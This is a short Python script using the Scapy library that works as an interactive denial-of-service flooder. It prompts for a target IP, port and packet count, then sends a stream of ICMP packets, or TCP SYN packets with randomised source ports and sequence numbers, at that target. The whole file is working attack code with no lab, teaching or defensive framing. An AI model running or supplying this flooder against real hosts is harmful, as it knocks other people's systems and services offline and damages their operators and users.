from scapy.all import *

def main():
    attack_type = input("Please select one of the attack types [tcp, icmp]: ")
    if attack_type == "icmp":
        icmpflood()
    elif attack_type == "tcp":
        tcpflood()
    else:
        print("An attack type must be selected. \n")
        main()


def icmpflood():
    target = destinationIP()
    packet_amnt = input("How many packets would you like to send: ")

    for x in range (0,int(packet_amnt)):
        send(IP(dst=target)/ICMP())


def tcpflood():
    target = destinationIP()
    targetPort = destinationPort()
    packet_amnt = input("How many packets would you like to send: ")

    for x in range(0, int(packet_amnt)):
        send(IP(dst=target)/TCP(dport=targetPort, flags="S", seq=RandShort(), ack=RandShort(), sport=RandShort()))


def destinationIP():
    dstIP = input("Destination IP: ")
    return dstIP


def destinationPort():
    dstPort = input("Destination Port: ")
    return int(dstPort)


main()
input('To exit, Press Enter key')
